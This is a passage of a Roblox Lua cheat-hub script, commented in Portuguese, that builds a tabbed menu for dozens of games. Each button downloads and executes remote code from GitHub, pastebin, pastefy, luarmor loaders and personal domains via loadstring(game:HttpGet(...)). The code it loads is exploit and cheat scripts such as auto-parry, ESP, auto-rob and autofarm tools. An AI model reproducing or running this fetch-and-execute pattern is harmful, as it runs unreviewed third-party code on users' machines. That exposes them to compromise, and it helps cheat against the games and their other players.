        loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexisisback/Universall/refs/heads/main/Blade%20ball.lua", true))()
    end    
})

-- Criando a aba anime shadow
local AnimeShadowTab= Window:MakeTab({
    Name = "Anime Shadow",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba Anime Shadow
AnimeShadowTab:AddSection({
    Name = "Anime Shadow"
})

-- Corrigindo o botão Anime Shadow
AnimeShadowTab:AddButton({
    Name = "Executar Script",
    Callback = function()
        -- Executando o script do Anime Shadow
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
    end    
})

AnimeShadowTab:AddButton({
    Name = "Deng Hub",
    Callback = function()
        -- Executando o script do Anime Shadow
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DENGHUB2025/HUGHUB/main/WL", true))()
        
    end    
})

-- Criando a aba para o The Strongest Battlegrounds
local thestrongestbattlegroundsTab = Window:MakeTab({
    Name = "The Strongest Battlegrounds",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba
    PremiumOnly = false
})

-- Adicionando uma seção para o script do The Strongest Battlegrounds
local thestrongestbattlegroundsTab = thestrongestbattlegroundsTab:AddSection({
    Name = "The Strongest Battlegrounds"
})

-- Adicionando o botão para executar o script do The Strongest Battlegrounds
thestrongestbattlegroundsTab:AddButton({
    Name = "The Strongest Battlegrounds",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/autoparry.lua"))()
    end    
})

-- Adicionando o botão para executar o script do The Strongest Battlegrounds
thestrongestbattlegroundsTab:AddButton({
    Name = "SumitScripts",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/v9VSOfM5/raw"))()

    end    
})

thestrongestbattlegroundsTab:AddButton({
    Name = "Suguru geto",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Nova2ezz/Geto-suguru/refs/heads/main/Nova2ezz"))()
    end    
})

-- Adicionando o botão para executar o script do The Strongest Battlegrounds
thestrongestbattlegroundsTab:AddButton({
    Name = "Zygarde V2 (Funciona no Pc/Mobile)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/refs/heads/main/ZygardeV1.txt"))()
    end    
})


-- Adicionando o botão para executar o script do The Strongest Battlegrounds
thestrongestbattlegroundsTab:AddButton({
    Name = "Speed Hub X (Funciona no Pc/Mobile)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
    end    
})

-- Criando a aba para A BROOKHAVEN
local NinjaLegendsTab = Window:MakeTab({
    Name = "Ninja Legends",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local NinjaLegendsTab = NinjaLegendsTab:AddSection({
    Name = "Ninja Legends"
})

-- Botão para executar o script BROOKHAVEN
NinjaLegendsTab:AddButton({
    Name = "LSndiFye Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://pastebin.com/raw/LSndiFye",true))()
    end    
})

NinjaLegendsTab:AddButton({
    Name = "LSndiFye Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kooggy/Open-Source/main/Ninja%20Legends.lua"))()
    end    
})


-- Criando a aba Anime Crossover Defense
local AnimeCrossoverTab = Window:MakeTab({
    Name = "Anime Crossover Defense",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba Anime Crossover Defense
AnimeCrossoverTab:AddSection({
    Name = "Anime Crossover Defense"
})

-- Adicionando o botão para executar o script
AnimeCrossoverTab:AddButton({
    Name = "Executar Script",
    Callback = function()
        -- Executa o script do Anime Crossover Defense
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/refs/heads/main/Anime%20Crossover%20Defense"))()
    end    
})

-- Criando a aba para o Jailbreak
local JailBreakTab = Window:MakeTab({
    Name = "Jailbreak",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba
    PremiumOnly = false
})

-- Adicionando uma seção para o script do Jailbreak
local JailBreakTab = JailBreakTab:AddSection({
    Name = "Jailbreak"
})

-- Adicionando o botão para executar o script do Jailbreak
JailBreakTab:AddButton({
    Name = "SnipeHype200",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SnipeHype200/i-music/main/beta.lua"))()
    end    
})

-- Adicionando o botão para executar o script do Jailbreak
JailBreakTab:AddButton({
    Name = "Project Auto V5 (Funciona no Pc/Mobile)",
    Callback = function()
        loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoRobV5'))()
    end    
})

-- Criando a aba Anime Crossover Defense
local BuildABoatSimulatorTab = Window:MakeTab({
    Name = "Build a Boat Simulator",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba Anime Crossover Defense
BuildABoatSimulatorTab:AddSection({
    Name = "Build a Boat Simulator"
})

-- Adicionando o botão para executar o script
BuildABoatSimulatorTab:AddButton({
    Name = "Execute 1",
    Callback = function()
        -- Executa o script do Anime Crossover Defense
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/BuildABoatSimulator.lua"))()
        
    end    
})

-- Adicionando o botão para executar o script
BuildABoatSimulatorTab:AddButton({
    Name = "Execute 2",
    Callback = function()
        -- Executa o script do Anime Crossover Defense
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/Rolly_Hub/main/open-source-trash-loader.exe.yeah"))()
        
    end    
})

-- Adicionando o botão para executar o script
BuildABoatSimulatorTab:AddButton({
    Name = "Execute 3",
    Callback = function()
        -- Executa o script do Anime Crossover Defense
        loadstring(game:HttpGet('https://raw.githubusercontent.com/XRoLLu/UWU/main/BUILD%20A%20BOAT%20FOR%20TREASURE.lua'))()
        
        -- Notificação de sucesso após a execução
    end    
})

-- Adicionando o botão para executar o script
BuildABoatSimulatorTab:AddButton({
    Name = "Ather Hub",
    Callback = function()
        -- Executa o script do Anime Crossover Defense
        loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua'))()
        
    end    
})

-- Adicionando o botão para executar o script
BuildABoatSimulatorTab:AddButton({
    Name = "Synix Hub",
    Callback = function()
        -- Executa o script do Anime Crossover Defense
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZorSonMods/SyniX-HUB-BUILD-BOAT-FOR-TREASURE/main/script"))()
    end    
})

-- Criando a aba para A Meme Sea
local MemeSeaTab = Window:MakeTab({
    Name = "Meme Sea",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local MemeSeaTab = MemeSeaTab:AddSection({
    Name = "Meme Sea"
})

-- Botão para executar o script Meme Sea
MemeSeaTab:AddButton({
    Name = "Shiny Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaqueHub/ShinyHub-MMSea/main/MEME%20SEA%20PROTECT.txt"))()
    end    
})

-- Criando a aba 
local RealmRampageTab = Window:MakeTab({
    Name = "Realm Rampage",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
RealmRampageTab:AddSection({
    Name = "Realm Rampage"
})

-- Adicionando o botão para executar o script
AnimeCrossoverTab:AddButton({
    Name = "Realm Rampage (Funciona no celular)",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CrimsonBytesLua/roblox-releases/main/realmrampage"))()
    end    
})

-- Criando a aba anime shadow
local FruitsWarriosTab= Window:MakeTab({
    Name = "Fruits Warriors",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
FruitsWarriosTab:AddSection({
    Name = "Fruits Warriors"
})

-- Corrigindo o botão 
FruitsWarriosTab:AddButton({
    Name = "Script 1",
    Callback = function()
        -- Executando o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Mei2232/ZaqueHub/main/Fruit%20Warrior"))()

    end    
})

-- Criando a aba para A BROOKHAVEN
local BrookHavenTab = Window:MakeTab({
    Name = "BrookHaven",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local BrookHavenTab = BrookHavenTab:AddSection({
    Name = "BrookHaven"
})

-- Botão para executar o script BROOKHAVEN
BrookHavenTab:AddButton({
    Name = "Sander X (Funciona no Pc/Mobile)",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/sXPiterXs1111/SanderXNewUpdate3.1.lua/main/SanderXNewUpdate.lua"))()
        -- Notificação de sucessoa
    end    
})

-- Botão para executar o script BROOKHAVEN
BrookHavenTab:AddButton({
    Name = "YHUB",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Luarmor123/community-Y-HUB/refs/heads/main/YHUB%20ENGLISH"))()

        -- Notificação de sucessoa
    end    
})

-- Botão para executar o script BROOKHAVEN
BrookHavenTab:AddButton({
    Name = "Nousigi Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
    end    
})

-- Botão para executar o script BROOKHAVEN
BrookHavenTab:AddButton({
    Name = "F0rtui0us hub (Funciona no Pc/Mobile)",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TrollGuiMaker/f0rtuit0us-hub/refs/heads/main/old"))()
        -- Notificação de sucessoa
    end    
})

-- Criando a aba para o Weak Legacy 2
local WeakLegacyTab = Window:MakeTab({
    Name = "Weak Legacy 2",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local WeakLegacySection = WeakLegacyTab:AddSection({
    Name = "Controle do Script"
})

-- Botão para executar o script Weak Legacy 2
WeakLegacyTab:AddButton({
    Name = "Executar Script",  -- Nome do botão alterado
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/W2/main/SW", true))()

    end    
})

-- Criando a aba 
local BeeSwarmSimulatorTab = Window:MakeTab({
    Name = "Bee Swarm Simulator",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
BeeSwarmSimulatorTab:AddSection({
    Name = "Bee Swarm Simulator"
})

-- Adicionando o botão para executar o script
BeeSwarmSimulatorTab:AddButton({
    Name = "Willow Hub (Funciona no celular)",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/012b8bc02b1c578b7766f2a4511c3c47.lua"))()
        -- Notificação de sucesso após a execução

    end    
})


-- Criando a aba para Gym League
local GymLeagueTab = Window:MakeTab({
    Name = "Gym League",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local GymLeagueSection = GymLeagueTab:AddSection({
    Name = "Controle do Script"
})

-- Botão para executar o script Gym League
GymLeagueTab:AddButton({
    Name = "Executar Script Gym League",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Gym%20League.lua"))()
        

    end    
})

-- Criando a aba para 
local PestGoTab = Window:MakeTab({
    Name = "PETS GO!",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local PestGoTab = PestGoTab:AddSection({
    Name = "PETS GO!"
})

-- Botão para executar o script
PestGoTab:AddButton({
    Name = "AtherHub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua"))()
        
        -- Notificação de sucesso

    end    
})

-- Criando a aba para
local TowerOfHellTab = Window:MakeTab({
    Name = "Tower Of Hell",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local TowerOfHellTab = TowerOfHellTab:AddSection({
    Name = "Tower Of Hell"
})

-- Botão para executar o script 
TowerOfHellTab:AddButton({
    Name = "Sprin Hub (Funciona no Pc/Mobile)",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/dqvh/dqvh/main/SprinHub",true))()
        
        -- Notificação de sucesso

    end    
})

-- Criando a aba para Restaurant Tycoon 2
local RestaurantTycoon2Tab = Window:MakeTab({
    Name = "Restaurant Tycoon 2",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local RestaurantTycoon2Tab = RestaurantTycoon2Tab:AddSection({
    Name = "Restaurant Tycoon 2"
})

-- Botão para executar o script Restaurant Tycoon 2
RestaurantTycoon2Tab:AddButton({
    Name = "Zeld Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JuninhoOGado/ScriptsSite/main/Script247"))()
        
        -- Notificação de sucesso

    end    
})


-- Criando a aba para A Slap Battles
local SlapBattlesTab = Window:MakeTab({
    Name = "Slap Battles",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local SlapBattlesTab = SlapBattlesTab:AddSection({
    Name = "Slap Battles"
})

-- Botão para executar o script Slap Battles
SlapBattlesTab:AddButton({
    Name = "Slap Battles",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Hawk983/Phantom-/main/UNIVERSAL"))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para
local WhosTheSpyTab = Window:MakeTab({
    Name = "Who's the Spy?",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local WhosTheSpyTab = WhosTheSpyTab:AddSection({
    Name = "Who's the Spy?"
})

-- Botão para executar o script 
WhosTheSpyTab:AddButton({
    Name = "SPY ESP",  -- Nome do botão
    Callback = function()

        loadstring(game:HttpGet("https://pastefy.app/eeWpIR5D/raw"))()    
        -- Notificação de sucesso

    end    
})

-- Criando a aba para 
local TPSStrretSoccerTab = Window:MakeTab({
    Name = "TPS: Street Soccer",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local TPSStrretSoccerTab = TPSStrretSoccerTab:AddSection({
    Name = "TPS: Street Soccer"
})

-- Botão para executar o script
TPSStrretSoccerTab:AddButton({
    Name = "V4P Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/S-RealScript/FreeVersionV4P/refs/heads/main/S-RealScriptV4Free"))()


        -- Notificação de sucessoa

    end    
})

-- Criando a aba 
local SurvivetheKillerTab = Window:MakeTab({
    Name = "Survive the Killer!",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
SurvivetheKillerTab:AddSection({
    Name = "Survive the Killer!"
})

-- Adicionando o botão para executar o script
SurvivetheKillerTab:AddButton({
    Name = "execute",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Milan08Studio/ChairWare/main/main.lua"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba 
local CarDealershipTycoonTab = Window:MakeTab({
    Name = "Car Dealership Tycoon",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
CarDealershipTycoonTab:AddSection({
    Name = "Car Dealership Tycoon"
})

-- Adicionando o botão para executar o script
CarDealershipTycoonTab:AddButton({
    Name = "LDS Hub (Funciona no celular)",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/49f02b0d8c1f60207c84ae76e12abc1e.lua'))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba para A UNIVERSAL TIME
local AUniversalTimeTab = Window:MakeTab({
    Name = "A Universal Time",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local AUniversalTimeTab = AUniversalTimeTab:AddSection({
    Name = "A Universal Time"
})

-- Botão para executar o script A UNIVERSAL TIME
AUniversalTimeTab:AddButton({
    Name = "Flame's Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JuninhoOGado/ScriptsSite/main/Script287"))()
        
        -- Notificação de sucessoa

    end    
})

-- Botão para executar o script A UNIVERSAL TIME
AUniversalTimeTab:AddButton({
    Name = "Desire Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/welomenchaina/Desire-s/refs/heads/main/desire%20hub%20rules",true))()
        
        -- Notificação de sucessoa

    end    
})

-- Criando a aba Pet Simulator 99
local WelcomeToBloxBurgTab = Window:MakeTab({
    Name = "Welcome to Bloxburg",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local WelcomeToBloxBurgTab = WelcomeToBloxBurgTab:AddSection({
    Name = "Welcome to Bloxburg"
})

-- Corrigindo o botão "Zap Hub"
WelcomeToBloxBurgTab:AddButton({
    Name = "Aussie WIRE",
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()

    end    
})

-- Criando a aba Pet Simulator 99
local ProjectLazarusTab = Window:MakeTab({
    Name = " Project Lazarus",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local ProjectLazarusTab = ProjectLazarusTab:AddSection({
    Name = " Project Lazarus"
})

-- Corrigindo o botão "Zap Hub"
ProjectLazarusTab:AddButton({
    Name = "Aussie WIRE",
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
 
    
    end    
})

-- Criando a aba 
local AnimeSlashingSimulatorTab = Window:MakeTab({
    Name = "Anime Slashing Simulator",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
AnimeSlashingSimulatorTab:AddSection({
    Name = "Anime Slashing Simulator"
})

-- Adicionando o botão para executar o script
AnimeSlashingSimulatorTab:AddButton({
    Name = "Execute",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/AnimeSlashing"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba para Survival Stories
local SurvivalStoriesTab = Window:MakeTab({
    Name = "Survival Stories",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local SurvivalStoriesTab = SurvivalStoriesTab:AddSection({
    Name = "Survival Stories"
})

-- Botão para executar o script Survival Stories
SurvivalStoriesTab:AddButton({
    Name = "Tora IsMe",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/SurvivalStories"))()
        
        -- Notificação de sucesso

    end    
})

-- Criando a aba 
local SpeedRun4Tab = Window:MakeTab({
    Name = "Speed Run 4",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
SpeedRun4Tab:AddSection({
    Name = "Speed Run 4"
})

-- Adicionando o botão para executar o script
SpeedRun4Tab:AddButton({
    Name = "Execute",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/PlayerHubOther/main/PlayerHubLoader.lua"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba para 
local EscapePapaPizzasPizzeriaTab = Window:MakeTab({
    Name = "Escape Papa Pizzas Pizzeria",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local EscapePapaPizzasPizzeriaTab = EscapePapaPizzasPizzeriaTab:AddSection({
    Name = "Escape Papa Pizzas Pizzeria"
})

-- Botão para executar o script 
EscapePapaPizzasPizzeriaTab:AddButton({
    Name = "ExplotFin",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterGuy/FBC/refs/heads/main/Protected_3203896199155968.txt"))()
        
        -- Notificação de sucesso

    end    
})

-- Criando a aba 
local DandysWorldTab = Window:MakeTab({
    Name = "Dandy's World",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
DandysWorldTab:AddSection({
    Name = "Dandy's World"
})

-- Adicionando o botão para executar o script
DandysWorldTab:AddButton({
    Name = "Execute",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://pastebin.com/raw/H3u62n7D"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Adicionando o botão para executar o script
DandysWorldTab:AddButton({
    Name = "Soup Hub",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Soup182/Soup-Hub-Dandy-s-World-Hub-/refs/heads/main/Dw%20Soup%20Hub.lua")) ()
        -- Notificação de sucesso após a execução

    end    
})

-- Adicionando o botão para executar o script
DandysWorldTab:AddButton({
    Name = "Mox Hub",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ApparentlySpooks/moxhubV3/refs/heads/main/dandys%20world.txt'))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba 
local JujutsuShenanigansTab = Window:MakeTab({
    Name = "Jujutsu Shenanigans",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
JujutsuShenanigansTab:AddSection({
    Name = "Jujutsu Shenanigans"
})

-- Adicionando o botão para executar o script
JujutsuShenanigansTab:AddButton({
    Name = "Xenon Hub (Funciona no celular)",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7fe29a6a9dc2a08c84b8e2f0f5ef5810.lua"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba Broken Bones IV
local AnimeShadowTab= Window:MakeTab({
    Name = "Broken Bones IV",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba Broken Bones IV
AnimeShadowTab:AddSection({
    Name = "Broken Bones IV"
})

-- Corrigindo o botão Broken Bones IV
AnimeShadowTab:AddButton({
    Name = "0x88 Hub",
    Callback = function()
        -- Executando o script do Broken Bones IV
        loadstring(game:HttpGet("https://raw.githubusercontent.com/0x88-debug/scripts_solara/main/BrokenBonesIV-autofarm.txt"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba para A Haze Piece
local HazePieceTab = Window:MakeTab({
    Name = "Haze Piece",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local HazePieceTab = HazePieceTab:AddSection({
    Name = "Haze Piece"
})

-- Botão para executar o script Slap Battles
HazePieceTab:AddButton({
    Name = "Hyper Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JuninhoOGado/ScriptsSite/main/Script285"))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para 
local BathroomAttackTab = Window:MakeTab({
    Name = "Bathroom Attack",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local BathroomAttackTab = BathroomAttackTab:AddSection({
    Name = "Bathroom Attack"
})

-- Botão para executar o script 
BathroomAttackTab:AddButton({
    Name = "Bathroom Attack",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JuninhoOGado/ScriptsSite/main/Script285"))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para 
local TPSStrretSoccerTab = Window:MakeTab({
    Name = "TPS: Street Soccer",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local TPSStrretSoccerTab = TPSStrretSoccerTab:AddSection({
    Name = "TPS: Street Soccer"
})

-- Botão para executar o script
TPSStrretSoccerTab:AddButton({
    Name = "V4P Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/S-RealScript/FreeVersionV4P/refs/heads/main/S-RealScriptV4Free"))()

    end    
})

-- Criando a aba para 
local SurvivetheKillerTab = Window:MakeTab({
    Name = "Survive the Killer",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local SurvivetheKillerTab = SurvivetheKillerTab:AddSection({
    Name = "Survive the Killer"
})

-- Botão para executar o script 
SurvivetheKillerTab:AddButton({
    Name = "Chairware Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Milan08Studio/ChairWare/main/main.lua"))()
        
        -- Notificação de sucesso

    end    
})

-- Criando a aba para A ANIME BLAST SIMULATOR
local AnimeBlastSimulatorTab = Window:MakeTab({
    Name = "Anime Blast Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local AnimeBlastSimulatorTab = AnimeBlastSimulatorTab:AddSection({
    Name = "Anime Blast Simulator"
})

-- Botão para executar o script ANIME BLAST SIMULATOR
AnimeBlastSimulatorTab:AddButton({
    Name = "Project V",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Vmax0/RobloxScripts/main/ProjectVMAX/MainFree.lua"))()
        

    end    
})

-- Criando a aba
local SquidGameXTab = Window:MakeTab({
    Name = "Squid Game X",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
SquidGameXTab:AddSection({
    Name = "Squid Game X"
})

-- Corrigindo o botão 
SquidGameXTab:AddButton({
    Name = "Rip V2",
    Callback = function()
        -- Executando o script do
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/SquidGameX.lua"))()

    end    
})

-- Criando a aba 
local DrivingEmpireTab = Window:MakeTab({
    Name = "Driving Empire",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
DrivingEmpireTab:AddSection({
    Name = "Driving Empire"
})

-- Adicionando o botão para executar o script
DrivingEmpireTab:AddButton({
    Name = "Fiber Hub",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Aaron999S/FiberHub/main/Main"))()
        -- Notificação de sucesso após a execução

    end    
})


-- Criando a aba para 
local AnimeStrikeSimulatorTab = Window:MakeTab({
    Name = "Anime Strike Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local AnimeStrikeSimulatorTab = AnimeStrikeSimulatorTab:AddSection({
    Name = "Anime Strike Simulator"
})

-- Botão para executar o script 
AnimeStrikeSimulatorTab:AddButton({
    Name = "Presine",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet('https://raw.githubusercontent.com/RSenix3/PrestineHub/refs/heads/main/PrestineHubV1'))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A 
local MurderVsSherrifsDuelsTab = Window:MakeTab({
    Name = "Murderers VS Sherrifs Duels",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local MurderVsSherrifsDuelsTab = MurderVsSherrifsDuelsTab:AddSection({
    Name = "Murderers VS Sherrifs Duels"
})

-- Botão para executar o script
MurderVsSherrifsDuelsTab:AddButton({
